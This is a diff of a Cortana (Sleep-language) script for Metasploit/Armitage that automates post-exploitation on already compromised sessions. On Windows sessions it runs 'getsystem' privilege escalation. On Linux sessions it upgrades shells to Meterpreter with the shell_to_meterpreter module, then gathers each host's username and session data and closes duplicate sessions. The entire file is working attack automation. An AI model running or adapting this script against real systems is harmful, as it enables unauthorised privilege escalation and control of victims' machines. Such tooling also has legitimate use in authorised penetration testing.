@@ -1,54 +1,67 @@
 debug(7);
 
-on ready {
-   println("ready");
-}
-
 command arguments {
    local('@sessions');
    @sessions = split(';', $1);
-   println("arguments");
    fire_event_local("manageSessions", @sessions)
 }
 
 on manageSessions {
-   println("privileges");
    local('$console $session @info @sessions');
    $console = console();
+   @sessions = $1;
 
    on("console", $this);
 
    foreach $session ($1) {
       @info = split(',', $session);
-      println(@info);
+      #println(@info);
       if (@info[1] eq "windows") {
+         #println("if");
          m_cmd(@info[0], "get priv");
          sleep(1000);
          m_cmd(@info[0], "getsystem");
          sleep(3000);
       }
       else {
-         println("else");
+         #println("else");
          cmd($console, "jobs -K");
-         cmd($console, "sessions -u @info[0] ");
+         cmd($console, "use post/multi/manage/shell_to_meterpreter");
+         cmd_set($console, %(SESSION => @info[0]));
+         cmd($console, "exploit -j");
+
          yield;
+         while ($2 ne "exploit -j") {
+            yield;
+         }
       }
    }
-   #sleep(30000);
-   fire_event_local("checkNewPrivileges", $1);
+   sleep(30000);
+   fire_event_local("checkNewPrivileges", @sessions);
 }
 
 on checkNewPrivileges {
-   local('$session @info');
+   local('$session @sessions @info %out %r $host $user $sid');
+   on("meterpreter", $this);
+   %out = sessions();
+   @sessions = $1;
 
-   foreach $session ($1) {
+   foreach $session (@sessions) {
       @info = split(',', $session);
       if (@info[1] eq "windows") {
          m_cmd(@info[0], "getuid");
-         sleep(2000);
+
+         yield;
+
+         $sid = @info[0];
+         %r = %out[$sid];
+         $host = %r["host"];
+         $user = %r["username"];
+
+         println("$host" . "," . "$sid" . "," . "$user");
       }
    }
-   fire_event_local("getNewSessions", $1);
+   fire_event_local("getNewSessions", @sessions);
 }
 
 on getNewSessions {
@@ -66,28 +79,30 @@ on getNewSessions {
       $type = %r["type"];
       $user = %r["username"];
 
+      println("$host $type $user")
+
       foreach $session ($1) {
          @info = split(',', $session);
          $close = @info[0];
          if (@info[2] eq $host && @info[1] eq "linux") {
             if ($sessionNum > @info[0]) {
                println("$host" . "," . "$sessionNum" . "," . "$user");
-               session_close($sid);
+               session_close(@info[0]);
             }
          }
       }
    }
-   sleep(3000);
+   sleep(10000);
    quit();
 }
 
-on meterpreter_getuid {
-   local('%out %r $host $user');
+#on meterpreter_getuid {
+#   local('%out %r $host $user');
 
-   %out = sessions();
-   %r = %out[$1];
-   $host = %r["host"];
-   $user = %r["username"];
+#   %out = sessions();
+#   %r = %out[$1];
+#   $host = %r["host"];
+#   $user = %r["username"];
 
-   println("$host" . "," . "$1" . "," . "$user");
-}
+#   println("$host" . "," . "$1" . "," . "$user");
+#}
